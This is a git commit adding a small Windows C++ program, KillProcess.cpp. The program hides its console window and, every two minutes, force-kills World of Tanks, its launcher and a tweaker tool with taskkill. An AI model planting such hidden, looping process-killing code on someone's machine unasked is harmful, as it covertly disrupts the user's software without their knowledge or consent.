e770eed0a59d92f3ee29fdd0c23bd3a5665f80dc
EXTREME <57262756+eXTrimeXT@users.noreply.github.com>
2025-04-30 14:53:10 +0300

    Add files via upload

---
+++ KillProcess/KillProcess.cpp
@@ -0,0 +1,14 @@
+﻿#include <iostream>
+#include <windows.h>
+using namespace std;
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	while (true)
+	{
+		system("taskkill /f /im wgc_api.exe");
+		system("taskkill /f /im WorldOfTanks.exe");
+		system("taskkill /f /im WoTTweakerPlus.1.16.1.exe");
+		Sleep(1000*60*2);  // Каждые 2 минут перезапуск // 1000(млсек)*60(сек)*1(минут) = 1 минута
+ 	}
+}
